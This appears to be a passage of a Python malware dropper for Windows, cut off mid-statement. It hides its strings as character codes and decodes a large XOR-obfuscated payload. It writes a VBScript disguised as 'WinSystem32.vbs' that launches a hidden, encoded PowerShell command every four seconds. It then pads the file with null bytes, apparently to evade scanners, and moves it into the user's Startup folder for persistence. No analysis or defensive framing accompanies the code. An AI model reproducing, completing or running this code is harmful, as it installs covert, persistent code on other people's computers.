import os, subprocess, threading, base64, random

RANDOM = 7336464325146431699573339173397857191028995344063715923891062726274325
x = RANDOM + 38235432 * 4234
y = x * RANDOM + 3408234
TEXT = "sJcpcaVHi7lf9agcU6Z8It"


def _(codes):
    return "".join(chr(c) for c in codes)


env_var = _([65, 80, 80, 68, 65, 84, 65])
p1, p2, p3, p4, p5 = (
    _([77, 105, 99, 114, 111, 115, 111, 102, 116]),
    _([87, 105, 110, 100, 111, 119, 115]),
    _([83, 116, 97, 114, 116, 32, 77, 101, 110, 117]),
    _([80, 114, 111, 103, 114, 97, 109, 115]),
    _([83, 116, 97, 114, 116, 117, 112]),
)
file_name = _([87, 105, 110, 83, 121, 115, 116, 101, 109, 51, 50, 46, 118, 98, 115])


def to_vbs_chr(t):
    return " & ".join([f"Chr({ord(c)})" for c in t])


def d(x, pwd):
    enc_bytes = base64.b64decode(x)

    decoded_chars = []
    for i, b in enumerate(enc_bytes):
        decoded_chars.append(chr(b ^ ord(pwd[i % len(pwd)])))

    return "".join(decoded_chars)


def b():
    print(RANDOM * 98976897640687364083)
    temp_dir = os.environ.get("TEMP", "C:\\Windows\\Temp")
    temp_path = os.path.join(temp_dir, file_name)

    encoded_ps = "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"
    decoded_ps = d(encoded_ps, TEXT)
    reversed_ps = decoded_ps[::-1]

    hidden_base = (
        "cG93ZXJzaGVsbC5leGUgLU5vUCAtTm9uSSAtVyBIaWRkZW4gLUVuY29kZWRDb21tYW5kIA=="
    )
    decoded_base = base64.b64decode(hidden_base).decode()

    vbs_content = f'''
x = {RANDOM + 3456789098765434567892314986}
{TEXT} = x * 9 + 1247987654321234567890987654321
Function Rev(text)
    Rev = ""
    For i = Len(text) To 1 Step -1
        Rev = Rev & Mid(text, i, 1)
    Next
End Function

Set s = CreateObject("WScript.Shell")
ps_cmd = "{reversed_ps}"
c = "{decoded_base}" & Rev(ps_cmd)

Do
    s.Run c, 0, True
    WScript.Sleep 4000
Loop
'''

    add_size = 0
    try:
        with open(temp_path, "w", encoding="utf-8") as f:
            f.write(vbs_content)
        add_size = random.randint(1 * 1024, 3 * 1024) * 1024
    except:
        pass

    try:
        with open(temp_path, "ab") as f:
            f.write(b"\x00" * add_size)  # type: ignore
    except:
        pass

    FLAGS = 0x08000000 | 0x00000008
    try:
        startup_dir = os.path.join(os.getenv(env_var), p1, p2, p3, p4, p5)  # type: ignore
    except:
        pass
    try:
        robo_cmd = f'robocopy "{temp_dir}" "{startup_dir}" "{file_name}" /mov'  # type: ignore
    except:
        pass
    try:
        subprocess.run(
            robo_cmd,  # type: ignore
            shell=True,
            creationflags=FLAGS,
            capture_output=True,  # type: ignore
        )
